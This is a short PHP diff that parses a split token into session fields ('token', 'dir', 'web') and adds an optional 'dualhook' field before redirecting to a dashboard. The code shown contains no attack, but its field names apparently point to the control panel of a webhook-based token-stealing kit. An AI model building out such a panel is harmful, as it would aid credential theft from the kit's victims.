@@ -17,8 +17,9 @@ if($token) {
         
         if(count($ex) >= 3) {
             $_SESSION['token'] = $ex[0];
-            $_SESSION['web'] = $ex[2];
             $_SESSION['dir'] = $ex[1];
+            $_SESSION['web'] = $ex[2];
+            $_SESSION['dualhook'] = $ex[3] ?? ''; // Dualhook is optional (4th field)
             header("Location: dashboard.php");
             exit();
         } else {
